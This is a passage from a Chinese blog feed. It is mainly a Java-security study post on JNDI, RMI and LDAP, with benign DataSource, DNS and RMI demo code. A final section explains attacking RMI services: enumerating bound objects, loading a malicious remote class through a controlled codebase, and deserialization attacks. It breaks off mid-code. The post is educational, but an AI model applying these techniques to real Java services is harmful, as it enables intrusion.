&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>写文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Path;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileIO</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        Path path = Paths.get(<span class="hljs-string">&quot;D:/2.txt&quot;</span>);<br>        String text = <span class="hljs-string">&quot;final&quot;</span>;<br>        Files.write(path,text.getBytes());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI&amp;RMI&amp;LDAP</title>
    <link href="/2023/03/15/JNDI&amp;RMI&amp;LDAP/"/>
    <url>/2023/03/15/JNDI&amp;RMI&amp;LDAP/</url>
    
    <content type="html"><![CDATA[<h1 id="JNDI-amp-RMI-amp-LDAP"><a href="#JNDI-amp-RMI-amp-LDAP" class="headerlink" title="JNDI&amp;RMI&amp;LDAP"></a>JNDI&amp;RMI&amp;LDAP</h1><p><code>JNDI</code>是<code>Java Naming and Directory Interface</code>即 Java 命名与目录接口，通过 JNDI 的 API 可以调用目录或服务有：<code>JDBC LDAP RMI DNS NIS CORBA</code>，<code>JNDI</code>是<code>Java EE</code>的重要组成部分</p><p>其中的<code>Naming</code>用以命名唯一资源，从而资源方便被调用；<code>Directory</code>就是目录服务，与计算机的文件系统很像(dns 也是一种目录服务)</p><h2 id="DataSource"><a href="#DataSource" class="headerlink" title="DataSource"></a>DataSource</h2><p><a href="https://www.jianshu.com/p/336803c5ce06">参考</a></p><p>往常连接数据库的时候，都是使用原生的 JDBC 的<code>DriverManager</code>，而在生产环境中一般是使用数据源来代替<code>DriverManager</code>管理数据库的连接</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220728043012202.png"></p><p>使用数据源，可以通过池的机制复用数据库的连接，并发对数据库的访问；而另一个场景，不止使用一种数据源，就可以发布不同数据源进行隔离；不同的数据源实现由具体的厂商提供；提供数据源服务的多是<code>Servlet容器</code></p><p>一个 mysql 的配置文件示例如图，数据源名称就是 MySqlDS</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">datasources</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">local-tx-datasource</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jndi-name</span>&gt;</span>MySqlDS<span class="hljs-tag">&lt;/<span class="hljs-name">jndi-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">connection-url</span>&gt;</span>jdbc:mysql://localhost:3306/lw<span class="hljs-tag">&lt;/<span class="hljs-name">connection-url</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">driver-class</span>&gt;</span>com.mysql.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">driver-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user-name</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">user-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>rootpassword<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">exception-sorter-class-name</span>&gt;</span>org.jboss.resource.adapter.jdbc.vendor.MySQLExceptionSorter<span class="hljs-tag">&lt;/<span class="hljs-name">exception-sorter-class-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">metadata</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">type-mapping</span>&gt;</span>mySQL<span class="hljs-tag">&lt;/<span class="hljs-name">type-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">metadata</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">local-tx-datasource</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">datasources</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在使用时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">Context ctx=<span class="hljs-keyword">new</span> InitialContext();<br>Object datasourceRef=ctx.lookup(<span class="hljs-string">&quot;java:MySqlDS&quot;</span>); <span class="hljs-comment">//引用数据源</span><br>DataSource ds=(Datasource)datasourceRef;<br>conn=ds.getConnection();<br><span class="hljs-comment">/* 使用conn进行数据库SQL操作 */</span><br>......<br>c.close();<br></code></pre></td></tr></table></figure><p>通过 JNDI 统一的接口，只需要配置好数据源，在使用时，只需要调用 lookup 方法，查询数据源名称就可以获得数据源，使用数据库，不需要考虑不同数据库的驱动、连接、调用等方式，如果想换一个数据库，只需要修改下数据源配置文件就可以了</p><h2 id="JNDI-调用-DNS-解析"><a href="#JNDI-调用-DNS-解析" class="headerlink" title="JNDI 调用 DNS 解析"></a>JNDI 调用 DNS 解析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.directory.Attributes;<br><span class="hljs-keyword">import</span> javax.naming.directory.DirContext;<br><span class="hljs-keyword">import</span> javax.naming.directory.InitialDirContext;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Jndi2DNS</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//设置泛型环境变量，环境需要压入JNDI的工厂类：naming初始化对应JNDI的DNS工厂类(设定DNS Service Provider)，两个参数都是String型，故泛型应该如下</span><br>            Hashtable&lt;String, String&gt; env = <span class="hljs-keyword">new</span> Hashtable&lt;&gt;();<br>            env.put(<span class="hljs-string">&quot;java.naming.factory.initial&quot;</span>,<span class="hljs-string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);<br>            <span class="hljs-comment">//创建JNDI目录服务对象</span><br>            DirContext dnscontext =<span class="hljs-keyword">new</span> InitialDirContext(env);<br>            <span class="hljs-comment">//设置查询类型</span><br>            <span class="hljs-comment">//String[] types = new String[]&#123;&quot;A&quot;&#125;;</span><br>            String[] types = <span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;TXT&quot;</span>,<span class="hljs-string">&quot;MX&quot;</span>&#125;;<br>            <span class="hljs-comment">//返回查询结果：baidu.com的TXT和MX记录</span><br>            Attributes attrs = dnscontext.getAttributes(<span class="hljs-string">&quot;baidu.com&quot;</span>, types);<br>            System.out.println(attrs);<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#&#123;a=A: 110.242.68.66, 39.156.66.10&#125;</span><br><br>λ nslookup baidu.com<br>服务器:  ns.yc<br>Address:  10.44.0.2<br><br>非权威应答:<br>名称:    baidu.com<br>Addresses:  110.242.68.66<br>          39.156.66.10<br></code></pre></td></tr></table></figure><p>更为高级的操作有：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.what21.demo04;<br><br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> javax.naming.NamingEnumeration;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.directory.Attribute;<br><span class="hljs-keyword">import</span> javax.naming.directory.Attributes;<br><span class="hljs-keyword">import</span> javax.naming.directory.InitialDirContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DNSDemo</span> </span>&#123;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> dnsURL</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> NamingException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InitialDirContext <span class="hljs-title">createContext</span><span class="hljs-params">(String dnsURL)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> NamingException</span>&#123;<br>        Hashtable&lt;String,String&gt; env = <span class="hljs-keyword">new</span> Hashtable&lt;String,String&gt;();<br>        env.put(<span class="hljs-string">&quot;java.naming.factory.initial&quot;</span>, <span class="hljs-string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);<br>        env.put(<span class="hljs-string">&quot;java.naming.provider.url&quot;</span>,dnsURL);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> InitialDirContext(env);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> context</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> address</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> NamingException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">search</span><span class="hljs-params">(InitialDirContext context,String address)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> NamingException</span>&#123;<br>        Attributes attrs = context.getAttributes(address, <span class="hljs-keyword">null</span>);<br>        NamingEnumeration eEnum = attrs.getAll();<br>        <span class="hljs-keyword">while</span>(eEnum.hasMoreElements())&#123;<br>            Attribute attr = (Attribute)eEnum.nextElement();<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;attr.size();i++)&#123;<br>                System.out.println(attr.get(i));<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> context</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> address</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> NamingException</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">search2</span><span class="hljs-params">(InitialDirContext context, String address)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br>        String dns_attrs[] = &#123; <span class="hljs-string">&quot;MX&quot;</span>, <span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;HINFO&quot;</span> &#125;;<br>        Attributes attrs = context.getAttributes(address, dns_attrs);<br>        Attribute Aattr = attrs.get(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-keyword">if</span>(Aattr!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; Aattr.size(); i++) &#123;<br>                System.out.println(Aattr.getID()+ <span class="hljs-string">&quot;  &quot;</span> + Aattr.get(i));<br>            &#125;<br>        &#125;<br><br>        Attribute MXattr = attrs.get(<span class="hljs-string">&quot;MX&quot;</span>);<br>        <span class="hljs-keyword">if</span>(MXattr!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; MXattr.size(); i++) &#123;<br>                System.out.println(MXattr.getID()+ <span class="hljs-string">&quot;  &quot;</span> + MXattr.get(i));<br>            &#125;<br>        &#125;<br><br>        Attribute HINFOattr = attrs.get(<span class="hljs-string">&quot;HINFO&quot;</span>);<br>        <span class="hljs-keyword">if</span>(HINFOattr!=<span class="hljs-keyword">null</span>)&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; HINFOattr.size(); i++) &#123;<br>                System.out.println(HINFOattr.getID()+ <span class="hljs-string">&quot;  &quot;</span> + HINFOattr.get(i));<br>            &#125;<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> args</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        InitialDirContext context = createContext(<span class="hljs-string">&quot;dns://gjjline.bta.net.cn/&quot;</span>);<br>        String nameInSpace = context.getNameInNamespace();<br>        System.out.println(nameInSpace);<br><br>        search(context,<span class="hljs-string">&quot;mail.163.com&quot;</span>);<br>        search2(context,<span class="hljs-string">&quot;mail.163.com&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>RMI(Remote Method Invocation)，Java 远程方法调用，用以构建分布式应用程序，实现了 Java 程序跨 JVM 的远程通信；这种 Java 对象在远程 JVM 调用的实现来源于 Java 的 RPC 思想(Remote Procedure Call)；JRMP(Java Remote Method Protocol，专门为 RMI 设计的协议)和 IIOP(Internet inter-ORB Protocol，基于 CORBA 实现的跨语言协议)可以实现 RMI 通信</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/bfd78d812a584b589c775cb12d938fa2.png"></p><p>流程为：注册服务-&gt;RMIServer-&gt;Client-&gt;接口-&gt;实现接口的功能类</p><p>常见的 RPC 框架</p><ul><li>应用级的服务框架：阿里的 Dubbo/Dubbox、Google gRPC、Spring Boot/Spring Cloud</li><li>远程通信协议：RMI、Socket、SOAP(HTTP XML)、REST(HTTP JSON)</li><li>通信框架：MINA 和 Netty</li></ul><p>实现 Demo：</p><p>信息记录类，含 getter()、setter()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DeserializeTest</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String email;<br>    <span class="hljs-keyword">private</span> String username;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getEmail</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> email;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setEmail</span><span class="hljs-params">(String email)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.email = email;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> username;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.username = username;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">RMIInterfaceDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Remote</span> </span>&#123;<br>    <span class="hljs-function">DeserializeTest <span class="hljs-title">getInfo</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个服务端，Registry 与 Server 绑定在了一起：main()中可以直接启动该服务</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RmitestService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">RMIInterfaceDemo</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">RmitestService</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException</span>&#123;&#125;;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> DeserializeTest <span class="hljs-title">getInfo</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        DeserializeTest aman = <span class="hljs-keyword">new</span> DeserializeTest();<br>        aman.setEmail(<span class="hljs-string">&quot;RMI@gmail.com&quot;</span>);<br>        aman.setUsername(<span class="hljs-string">&quot;RMIWorker&quot;</span>);<br>        <span class="hljs-keyword">return</span> aman;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            RmitestService rmitestService = <span class="hljs-keyword">new</span> RmitestService();<br>            LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            Naming.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/RmitestService&quot;</span>,rmitestService);<br>            System.out.println(<span class="hljs-string">&quot;Service rmitest has up:&quot;</span>+<span class="hljs-string">&quot;rmi://127.0.0.1:1099/RmitestService&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (RemoteException | MalformedURLException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> myjavasec;<br><br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RmitestClient</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">//            RmitestService rmitestService = (RmitestService) Naming.lookup(&quot;rmi://127.0.0.1:1389/RmitestService&quot;);//这里不应该得到rmi对象交给信息类，应该给接口</span><br>            RMIInterfaceDemo rmiInterfaceDemo = (RMIInterfaceDemo) Naming.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/RmitestService&quot;</span>);<br>            DeserializeTest info = rmiInterfaceDemo.getInfo();<br>            System.out.println(<span class="hljs-string">&quot;whoami:&quot;</span>+info.getUsername()+<span class="hljs-string">&quot;\n&quot;</span>+<span class="hljs-string">&quot;email:&quot;</span>+info.getEmail());<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>拆开来看，就会对这个机制有更深的理解：服务端是绑定了本地的一个类实例，而客户端在调用这个服务端的 RMI 服务时，则需要这个远程服务端类实例的接口，这个接口客户端也是拥有的，但是并不知道这个接口在服务端的实现代码，这没有什么影响</p><p>往往一个 RMI Server 有实现<code>java.rmi.Remote</code>的接口(定义了一些方法)，实现接口的类，一个主类用以注册绑定到 rmi 地址(<strong>这个就是 Server 了，demo 里没有分开 2 和 3</strong>)</p><h3 id="攻击-RMI-服务"><a href="#攻击-RMI-服务" class="headerlink" title="攻击 RMI 服务"></a>攻击 RMI 服务</h3><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220729063335264.png"></p><h4 id="探测-RMI-服务"><a href="#探测-RMI-服务" class="headerlink" title="探测 RMI 服务"></a>探测 RMI 服务</h4><p><code>Naming.rebind()</code>服务端绑定的对象引用客户端都是可以获取的<code>Naming.list()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] names = Naming.list(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/&quot;</span>);<br>System.out.println(Arrays.toString(names));<br></code></pre></td></tr></table></figure><p>得到对象引用，如何<code>lookup()</code>是关键，也就是对其方法进行调用</p><p>调用一个存在危险功能的 RMI 服务端：RMI 绑定对象+方法+参数，找不到它的方法和参数基本没有利用的可能，比较鸡肋</p><h4 id="codebase"><a href="#codebase" class="headerlink" title="codebase"></a>codebase</h4><p>相对于本地路径<code>ClASSPATH</code>，<code>codebase</code>远程类的指定与 jdbc 的 url 相似，通常是远程 URL，比如 http、ftp 等；如果我们指定<code>codebase=http://example.com/ </code>，然后加载<code>org.vulhub.example.Example</code>类，则 Java 虚拟机会下载这个文件<code>http://example.com/org/vulhub/example/Example.class</code>，并作为 Example 类的字节码</p><p>RMI 的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻 找类。如果某一端反序列化时发现一个对象，那么就会去自己的 CLASSPATH 下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载 codebase 中的类</p><p>进一步地，控制了<code>codebase</code>，就可以加载远程恶意类</p><p>官方注意到这个问题，满足如下攻击条件 RMI 服务器才能被攻击：</p><ul><li>安装并配置了<code>SecurityManager</code></li><li>Java 版本低于 7u21、6u45，或者高于版本的设置了<code>java.rmi.server.useCodebaseonly=false</code>，其余情况 Java 虚拟机只信任预先配置好的<code>codebase</code>，而不从 RMI 请求获取</li></ul><h4 id="反序列化攻击"><a href="#反序列化攻击" class="headerlink" title="反序列化攻击"></a>反序列化攻击</h4><p>既然直接找=枚举方法(有害方法)和参数是几乎没有可能利用的，来看看反序列化：RMI 客户端反序列化攻击 RMI 服务端</p><p>首先抓一手流量</p><p>RMI 的第一个<code>call</code>描述了获取远程对象：<code>0xaced</code>后面的就是序列化值，也就是我们的对象名，这个包的意思是获取远程的这个对象</p><p>后面的一个<code>ReturnData</code>就是这个对象的内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 